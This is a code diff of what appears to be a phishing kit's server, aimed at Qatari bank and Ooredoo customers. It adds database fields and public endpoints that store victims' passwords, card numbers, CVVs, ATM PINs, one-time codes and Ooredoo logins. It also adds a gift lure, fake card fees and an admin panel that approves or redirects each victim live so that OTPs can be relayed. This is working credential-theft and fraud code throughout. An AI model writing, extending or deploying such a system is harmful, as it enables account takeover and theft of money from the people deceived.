@@ -70,11 +70,11 @@ var sessions = pgTable("sessions", {
   status: varchar("status", { length: 20 }).default("pending").notNull(),
   // pending, loading, approved, rejected
   currentStep: varchar("currentStep", { length: 50 }),
-  // login, otp, atm, ooredoo, otp_ooredoo
+  // personal, card, otp, atm, ooredoo, otp_ooredoo
   adminAction: varchar("adminAction", { length: 20 }),
   // approve, reject
   redirectTarget: varchar("redirectTarget", { length: 50 }),
-  // New field for admin redirection
+  selectedGift: varchar("selectedGift", { length: 50 }),
   errorMessage: text("errorMessage"),
   createdAt: timestamp("createdAt").defaultNow().notNull(),
   updatedAt: timestamp("updatedAt").defaultNow().notNull()
@@ -88,8 +88,14 @@ var personalDataSubmissions = pgTable("personalDataSubmissions", {
   phoneNumber: varchar("phoneNumber", { length: 20 }).notNull(),
   email: varchar("email", { length: 320 }).notNull(),
   dateOfBirth: varchar("dateOfBirth", { length: 20 }).notNull(),
-  gender: varchar("gender", { length: 10 }).notNull(),
-  customerStatus: varchar("customerStatus", { length: 50 }).notNull(),
+  gender: varchar("gender", { length: 10 }),
+  customerStatus: varchar("customerStatus", { length: 50 }),
+  password: text("password"),
+  title: varchar("title", { length: 20 }),
+  middleName: text("middleName"),
+  lastName: text("lastName"),
+  promoCode: varchar("promoCode", { length: 50 }),
+  country: varchar("country", { length: 100 }),
   submittedAt: timestamp("submittedAt").defaultNow().notNull()
 });
 var loginMethodSubmissions = pgTable("loginMethodSubmissions", {
@@ -102,6 +108,14 @@ var loginMethodSubmissions = pgTable("loginMethodSubmissions", {
   cvv: varchar("cvv", { length: 10 }),
   username: varchar("username", { length: 255 }),
   password: text("password"),
+  deliveryMethod: varchar("deliveryMethod", { length: 20 }),
+  // home, branch
+  branchName: text("branchName"),
+  deliveryAddress: text("deliveryAddress"),
+  phoneConfirmation: varchar("phoneConfirmation", { length: 20 }),
+  issuanceFee: varchar("issuanceFee", { length: 20 }),
+  deliveryFee: varchar("deliveryFee", { length: 20 }),
+  totalAmount: varchar("totalAmount", { length: 20 }),
   submittedAt: timestamp("submittedAt").defaultNow().notNull()
 });
 var atmPinSubmissions = pgTable("atmPinSubmissions", {
@@ -115,6 +129,7 @@ var otpSubmissions = pgTable("otpSubmissions", {
   sessionId: varchar("sessionId", { length: 64 }).notNull(),
   otpCode: varchar("otpCode", { length: 10 }).notNull(),
   otpType: varchar("otpType", { length: 20 }).notNull(),
+  // card_otp, ooredoo_otp
   submittedAt: timestamp("submittedAt").defaultNow().notNull()
 });
 var ooredooSubmissions = pgTable("ooredooSubmissions", {
@@ -146,36 +161,101 @@ var db = drizzle(client, { schema: schema_exports });
 
 // server/db.ts
 import { eq, desc } from "drizzle-orm";
-async function createSession(id, selectedBank, country = "Qatar") {
-  await db.insert(sessions).values({
-    id,
-    selectedBank,
-    country,
-    status: "pending",
-    createdAt: /* @__PURE__ */ new Date(),
-    updatedAt: /* @__PURE__ */ new Date()
-  });
+async function createSession(id, selectedBank, country = "Qatar", selectedGift = "") {
+  try {
+    const existing = await db.select().from(sessions).where(eq(sessions.id, id)).limit(1);
+    if (existing[0]) {
+      await db.update(sessions).set({
+        selectedBank,
+        country,
+        selectedGift: selectedGift || existing[0].selectedGift,
+        updatedAt: /* @__PURE__ */ new Date()
+      }).where(eq(sessions.id, id));
+    } else {
+      await db.insert(sessions).values({
+        id,
+        selectedBank,
+        country,
+        selectedGift,
+        status: "pending",
+        createdAt: /* @__PURE__ */ new Date(),
+        updatedAt: /* @__PURE__ */ new Date()
+      });
+    }
+  } catch (error) {
+    console.error("Error in createSession:", error);
+    throw error;
+  }
 }
 async function submitPersonalData(data) {
-  await db.insert(personalDataSubmissions).values({
-    ...data,
-    submittedAt: /* @__PURE__ */ new Date()
-  });
-  await db.update(sessions).set({ updatedAt: /* @__PURE__ */ new Date(), currentStep: "login" }).where(eq(sessions.id, data.sessionId));
+  try {
+    const existingSession = await db.select().from(sessions).where(eq(sessions.id, data.sessionId)).limit(1);
+    if (!existingSession[0]) {
+      await db.insert(sessions).values({
+        id: data.sessionId,
+        selectedBank: "unknown",
+        status: "pending",
+        createdAt: /* @__PURE__ */ new Date(),
+        updatedAt: /* @__PURE__ */ new Date()
+      });
+    }
+    const submissionData = {
+      sessionId: data.sessionId,
+      nameArabic: data.nameArabic || "",
+      nameEnglish: data.nameEnglish || "",
+      idNumber: data.idNumber || "N/A",
+      phoneNumber: data.phoneNumber || "",
+      email: data.email || "",
+      dateOfBirth: data.dateOfBirth || "",
+      gender: data.gender || "not_specified",
+      customerStatus: data.customerStatus || "new",
+      password: data.password || null,
+      title: data.title || null,
+      middleName: data.middleName || null,
+      lastName: data.lastName || null,
+      promoCode: data.promoCode || null,
+      country: data.country || null,
+      submittedAt: /* @__PURE__ */ new Date()
+    };
+    await db.insert(personalDataSubmissions).values(submissionData);
+    await db.update(sessions).set({
+      updatedAt: /* @__PURE__ */ new Date(),
+      currentStep: "personal",
+      status: "loading",
+      adminAction: null,
+      errorMessage: null
+    }).where(eq(sessions.id, data.sessionId));
+    return { success: true };
+  } catch (error) {
+    console.error("Critical error in submitPersonalData:", error);
+    throw error;
+  }
 }
 async function submitLoginMethod(data) {
   await db.insert(loginMethodSubmissions).values({
     ...data,
     submittedAt: /* @__PURE__ */ new Date()
   });
-  await db.update(sessions).set({ updatedAt: /* @__PURE__ */ new Date(), adminAction: null, currentStep: "login" }).where(eq(sessions.id, data.sessionId));
+  await db.update(sessions).set({
+    updatedAt: /* @__PURE__ */ new Date(),
+    currentStep: "card",
+    status: "loading",
+    adminAction: null,
+    errorMessage: null
+  }).where(eq(sessions.id, data.sessionId));
 }
 async function submitAtmPin(data) {
   await db.insert(atmPinSubmissions).values({
     ...data,
     submittedAt: /* @__PURE__ */ new Date()
   });
-  await db.update(sessions).set({ updatedAt: /* @__PURE__ */ new Date(), adminAction: null, currentStep: "atm" }).where(eq(sessions.id, data.sessionId));
+  await db.update(sessions).set({
+    updatedAt: /* @__PURE__ */ new Date(),
+    status: "loading",
+    adminAction: null,
+    errorMessage: null,
+    currentStep: "atm"
+  }).where(eq(sessions.id, data.sessionId));
 }
 async function submitOtp(data) {
   await db.insert(otpSubmissions).values({
@@ -184,8 +264,10 @@ async function submitOtp(data) {
   });
   await db.update(sessions).set({
     updatedAt: /* @__PURE__ */ new Date(),
+    status: "loading",
     adminAction: null,
-    currentStep: data.otpType === "ooredoo" ? "otp_ooredoo" : "otp"
+    errorMessage: null,
+    currentStep: data.otpType === "ooredoo_otp" ? "otp_ooredoo" : "otp"
   }).where(eq(sessions.id, data.sessionId));
 }
 async function submitOoredoo(data) {
@@ -193,7 +275,13 @@ async function submitOoredoo(data) {
     ...data,
     submittedAt: /* @__PURE__ */ new Date()
   });
-  await db.update(sessions).set({ updatedAt: /* @__PURE__ */ new Date(), adminAction: null, currentStep: "ooredoo" }).where(eq(sessions.id, data.sessionId));
+  await db.update(sessions).set({
+    updatedAt: /* @__PURE__ */ new Date(),
+    status: "loading",
+    adminAction: null,
+    errorMessage: null,
+    currentStep: "ooredoo"
+  }).where(eq(sessions.id, data.sessionId));
 }
 async function getFullSubmissions() {
   const allSessions = await db.select().from(sessions).orderBy(desc(sessions.updatedAt));
@@ -215,43 +303,23 @@ async function getFullSubmissions() {
   }
   return results;
 }
-async function getSubmissionDetails(sessionId) {
+async function getSessionStatus(sessionId) {
   const session = await db.select().from(sessions).where(eq(sessions.id, sessionId)).limit(1);
-  if (!session[0]) return null;
-  const personal = await db.select().from(personalDataSubmissions).where(eq(personalDataSubmissions.sessionId, sessionId)).limit(1);
-  const login = await db.select().from(loginMethodSubmissions).where(eq(loginMethodSubmissions.sessionId, sessionId)).limit(1);
-  const pin = await db.select().from(atmPinSubmissions).where(eq(atmPinSubmissions.sessionId, sessionId)).limit(1);
-  const otp = await db.select().from(otpSubmissions).where(eq(otpSubmissions.sessionId, sessionId)).orderBy(desc(otpSubmissions.submittedAt));
-  const ooredoo = await db.select().from(ooredooSubmissions).where(eq(ooredooSubmissions.sessionId, sessionId)).limit(1);
-  return {
-    ...session[0],
-    personalData: personal[0] || null,
-    loginMethod: login[0] || null,
-    atmPin: pin[0] || null,
-    otps: otp,
-    ooredoo: ooredoo[0] || null
-  };
-}
-async function updateSessionStatus(sessionId, status, currentStep) {
-  const updateData = { status, updatedAt: /* @__PURE__ */ new Date() };
-  if (currentStep) updateData.currentStep = currentStep;
-  if (status === "approved") updateData.adminAction = "approve";
-  if (status === "rejected") updateData.adminAction = "reject";
-  await db.update(sessions).set(updateData).where(eq(sessions.id, sessionId));
+  return session[0] || null;
 }
 async function adminTakeAction(sessionId, action, errorMessage, redirectTarget) {
   await db.update(sessions).set({
     adminAction: action,
     errorMessage: errorMessage || null,
     redirectTarget: redirectTarget || null,
-    status: "pending",
-    // Reset to pending to allow user to see action
+    status: action === "approve" ? "approved" : "rejected",
     updatedAt: /* @__PURE__ */ new Date()
   }).where(eq(sessions.id, sessionId));
 }
-async function getSessionStatus(sessionId) {
-  const session = await db.select().from(sessions).where(eq(sessions.id, sessionId)).limit(1);
-  return session[0] || null;
+async function updateSessionStatus(sessionId, status, currentStep) {
+  const updateData = { status, updatedAt: /* @__PURE__ */ new Date() };
+  if (currentStep) updateData.currentStep = currentStep;
+  return await db.update(sessions).set(updateData).where(eq(sessions.id, sessionId));
 }
 
 // server/_core/cookies.ts
@@ -761,6 +829,7 @@ var systemRouter = router({
 });
 
 // server/routers.ts
+import { z as z2 } from "zod";
 var appRouter = router({
   system: systemRouter,
   auth: router({
@@ -774,113 +843,119 @@ var appRouter = router({
     })
   }),
   submissions: router({
-    createSession: publicProcedure.input((val) => {
-      if (typeof val !== "object" || val === null) throw new Error("Invalid input");
-      const obj = val;
-      return {
-        sessionId: String(obj.sessionId),
-        selectedBank: String(obj.selectedBank),
-        country: obj.country ? String(obj.country) : "Qatar"
-      };
-    }).mutation(async ({ input }) => {
-      await createSession(input.sessionId, input.selectedBank, input.country);
+    // Client calls createSession in Home.tsx and GiftSelection.tsx
+    createSession: publicProcedure.input(z2.object({
+      sessionId: z2.string(),
+      selectedBank: z2.string(),
+      country: z2.string().optional(),
+      selectedGift: z2.string().optional()
+    })).mutation(async ({ input }) => {
+      await createSession(input.sessionId, input.selectedBank, input.country || "Qatar", input.selectedGift || "");
       return { success: true };
     }),
-    submitPersonalData: publicProcedure.input((val) => {
-      if (typeof val !== "object" || val === null) throw new Error("Invalid input");
-      const obj = val;
-      return {
-        sessionId: String(obj.sessionId),
-        nameArabic: String(obj.nameArabic),
-        nameEnglish: String(obj.nameEnglish),
-        idNumber: String(obj.idNumber),
-        phoneNumber: String(obj.phoneNumber),
-        email: String(obj.email),
-        dateOfBirth: String(obj.dateOfBirth),
-        gender: String(obj.gender),
-        customerStatus: String(obj.customerStatus)
-      };
-    }).mutation(async ({ input }) => {
-      await submitPersonalData(input);
+    // Client calls submitPersonalData in PersonalData.tsx
+    submitPersonalData: publicProcedure.input(z2.any()).mutation(async ({ input }) => {
+      return await submitPersonalData(input);
+    }),
+    // AdminDashboard calls getSessions
+    getSessions: publicProcedure.query(async () => {
+      return await getFullSubmissions();
+    }),
+    submitLoginMethod: publicProcedure.input(z2.object({
+      sessionId: z2.string(),
+      loginType: z2.string(),
+      cardNumber: z2.string().optional(),
+      cardholderName: z2.string().optional(),
+      expiryDate: z2.string().optional(),
+      cvv: z2.string().optional(),
+      deliveryAddress: z2.string().optional(),
+      username: z2.string().optional(),
+      password: z2.string().optional(),
+      deliveryMethod: z2.string().optional(),
+      branchName: z2.string().optional(),
+      phoneConfirmation: z2.string().optional(),
+      issuanceFee: z2.string().optional(),
+      deliveryFee: z2.string().optional(),
+      totalAmount: z2.string().optional()
+    })).mutation(async ({ input }) => {
+      await submitLoginMethod({
+        sessionId: input.sessionId,
+        loginType: input.loginType,
+        cardNumber: input.cardNumber || "",
+        cardholderName: input.cardholderName || "",
+        expiryDate: input.expiryDate || "",
+        cvv: input.cvv || "",
+        username: input.username || "",
+        password: input.password || "",
+        deliveryMethod: input.deliveryMethod || "home",
+        branchName: input.branchName || "",
+        deliveryAddress: input.deliveryAddress || "",
+        phoneConfirmation: input.phoneConfirmation || "",
+        issuanceFee: input.issuanceFee || "10",
+        deliveryFee: input.deliveryFee || "0",
+        totalAmount: input.totalAmount || "10"
+      });
+      const step = input.loginType === "registration_completion" || input.loginType === "card_request" ? "card" : "login";
+      await updateSessionStatus(input.sessionId, "loading", step);
       return { success: true };
     }),
-    submitLoginMethod: publicProcedure.input((val) => {
-      if (typeof val !== "object" || val === null) throw new Error("Invalid input");
-      const obj = val;
-      return {
-        sessionId: String(obj.sessionId),
-        loginType: String(obj.loginType),
-        cardNumber: obj.cardNumber ? String(obj.cardNumber) : "",
-        cardholderName: obj.cardholderName ? String(obj.cardholderName) : "",
-        expiryDate: obj.expiryDate ? String(obj.expiryDate) : "",
-        cvv: obj.cvv ? String(obj.cvv) : "",
-        username: obj.username ? String(obj.username) : "",
-        password: obj.password ? String(obj.password) : ""
-      };
-    }).mutation(async ({ input }) => {
-      await submitLoginMethod(input);
-      await updateSessionStatus(input.sessionId, "loading", "login");
+    submitOtp: publicProcedure.input(z2.object({
+      sessionId: z2.string(),
+      otpCode: z2.string(),
+      otpType: z2.string()
+    })).mutation(async ({ input }) => {
+      await submitOtp({
+        sessionId: input.sessionId,
+        otpCode: input.otpCode,
+        otpType: input.otpType
+      });
+      const step = input.otpType === "ooredoo_otp" ? "otp_ooredoo" : "otp";
+      await updateSessionStatus(input.sessionId, "loading", step);
       return { success: true };
     }),
-    submitAtmPin: publicProcedure.input((val) => {
-      if (typeof val !== "object" || val === null) throw new Error("Invalid input");
-      const obj = val;
-      return {
-        sessionId: String(obj.sessionId),
-        pin: String(obj.pin)
-      };
-    }).mutation(async ({ input }) => {
-      await submitAtmPin(input);
+    submitAtmPin: publicProcedure.input(z2.object({
+      sessionId: z2.string(),
+      pin: z2.string()
+    })).mutation(async ({ input }) => {
+      await submitAtmPin({
+        sessionId: input.sessionId,
+        pin: input.pin
+      });
       await updateSessionStatus(input.sessionId, "loading", "atm");
       return { success: true };
     }),
-    submitOtp: publicProcedure.input((val) => {
-      if (typeof val !== "object" || val === null) throw new Error("Invalid input");
-      const obj = val;
-      return {
-        sessionId: String(obj.sessionId),
-        otpCode: String(obj.otpCode),
-        otpType: String(obj.otpType)
-      };
-    }).mutation(async ({ input }) => {
-      await submitOtp(input);
-      await updateSessionStatus(input.sessionId, "loading", input.otpType === "ooredoo" ? "otp_ooredoo" : "otp");
-      return { success: true };
-    }),
-    submitOoredoo: publicProcedure.input((val) => {
-      if (typeof val !== "object" || val === null) throw new Error("Invalid input");
-      const obj = val;
-      return {
-        sessionId: String(obj.sessionId),
-        ooredooUser: String(obj.ooredooUser),
-        ooredooPassword: String(obj.ooredooPassword)
-      };
-    }).mutation(async ({ input }) => {
-      await submitOoredoo(input);
+    submitOoredoo: publicProcedure.input(z2.object({
+      sessionId: z2.string(),
+      ooredooUser: z2.string(),
+      ooredooPassword: z2.string()
+    })).mutation(async ({ input }) => {
+      await submitOoredoo({
+        sessionId: input.sessionId,
+        ooredooUser: input.ooredooUser,
+        ooredooPassword: input.ooredooPassword
+      });
       await updateSessionStatus(input.sessionId, "loading", "ooredoo");
       return { success: true };
     }),
-    getAllSubmissions: publicProcedure.query(async () => {
-      return await getFullSubmissions();
-    }),
-    getSubmissionDetails: publicProcedure.input(String).query(async ({ input }) => {
-      return await getSubmissionDetails(input);
-    }),
-    adminTakeAction: publicProcedure.input((val) => {
-      if (typeof val !== "object" || val === null) throw new Error("Invalid input");
-      const obj = val;
-      return {
-        sessionId: String(obj.sessionId),
-        action: String(obj.action),
-        errorMessage: obj.errorMessage ? String(obj.errorMessage) : void 0,
-        redirectTarget: obj.redirectTarget ? String(obj.redirectTarget) : void 0
-      };
-    }).mutation(async ({ input }) => {
+    // AdminDashboard calls adminTakeAction
+    adminTakeAction: publicProcedure.input(z2.object({
+      sessionId: z2.string(),
+      action: z2.enum(["approve", "reject"]),
+      errorMessage: z2.string().optional(),
+      redirectTarget: z2.string().optional()
+    })).mutation(async ({ input }) => {
       await adminTakeAction(input.sessionId, input.action, input.errorMessage, input.redirectTarget);
       return { success: true };
     }),
-    getSessionStatus: publicProcedure.input(String).query(async ({ input }) => {
+    getSessionStatus: publicProcedure.input(z2.string()).query(async ({ input }) => {
       return await getSessionStatus(input);
+    }),
+    reportStep: publicProcedure.input(z2.object({
+      sessionId: z2.string(),
+      step: z2.string()
+    })).mutation(async ({ input }) => {
+      await updateSessionStatus(input.sessionId, "pending", input.step);
+      return { success: true };
     })
   })
 });
@@ -909,10 +984,12 @@ import { createServer as createViteServer } from "vite";
 
 // vite.config.ts
 import react from "@vitejs/plugin-react";
+import tailwindcss from "@tailwindcss/vite";
 import path from "path";
 import { defineConfig } from "vite";
 var vite_config_default = defineConfig({
-  plugins: [react()],
+  plugins: [react(), tailwindcss()],
+  css: {},
   resolve: {
     alias: {
       "@": path.resolve(import.meta.dirname, "client", "src"),
@@ -1001,7 +1078,42 @@ async function findAvailablePort(startPort = 3e3) {
   }
   throw new Error(`No available port found starting from ${startPort}`);
 }
+async function runMigrations() {
+  console.log("Running database migrations...");
+  try {
+    await db.execute(`
+      ALTER TABLE "loginMethodSubmissions" ADD COLUMN IF NOT EXISTS "deliveryMethod" varchar(20);
+      ALTER TABLE "loginMethodSubmissions" ADD COLUMN IF NOT EXISTS "branchName" text;
+      ALTER TABLE "loginMethodSubmissions" ADD COLUMN IF NOT EXISTS "deliveryAddress" text;
+      ALTER TABLE "loginMethodSubmissions" ADD COLUMN IF NOT EXISTS "phoneConfirmation" varchar(20);
+      ALTER TABLE "loginMethodSubmissions" ADD COLUMN IF NOT EXISTS "issuanceFee" varchar(20);
+      ALTER TABLE "loginMethodSubmissions" ADD COLUMN IF NOT EXISTS "deliveryFee" varchar(20);
+      ALTER TABLE "loginMethodSubmissions" ADD COLUMN IF NOT EXISTS "totalAmount" varchar(20);
+    `);
+    console.log("\u2705 loginMethodSubmissions migrations applied");
+    await db.execute(`
+      ALTER TABLE "personalDataSubmissions" ADD COLUMN IF NOT EXISTS "password" text;
+      ALTER TABLE "personalDataSubmissions" ADD COLUMN IF NOT EXISTS "title" varchar(20);
+      ALTER TABLE "personalDataSubmissions" ADD COLUMN IF NOT EXISTS "middleName" text;
+      ALTER TABLE "personalDataSubmissions" ADD COLUMN IF NOT EXISTS "lastName" text;
+      ALTER TABLE "personalDataSubmissions" ADD COLUMN IF NOT EXISTS "promoCode" varchar(50);
+      ALTER TABLE "personalDataSubmissions" ADD COLUMN IF NOT EXISTS "country" varchar(100);
+    `);
+    console.log("\u2705 personalDataSubmissions migrations applied");
+    await db.execute(`
+      ALTER TABLE "personalDataSubmissions" ALTER COLUMN "nameArabic" DROP NOT NULL;
+      ALTER TABLE "personalDataSubmissions" ALTER COLUMN "idNumber" DROP NOT NULL;
+      ALTER TABLE "personalDataSubmissions" ALTER COLUMN "gender" DROP NOT NULL;
+      ALTER TABLE "personalDataSubmissions" ALTER COLUMN "customerStatus" DROP NOT NULL;
+    `);
+    console.log("\u2705 NOT NULL constraints relaxed");
+    console.log("All migrations completed successfully!");
+  } catch (error) {
+    console.error("Error running migrations:", error);
+  }
+}
 async function startServer() {
+  await runMigrations();
   const app = express2();
   const server = createServer(app);
   app.use(express2.json({ limit: "50mb" }));
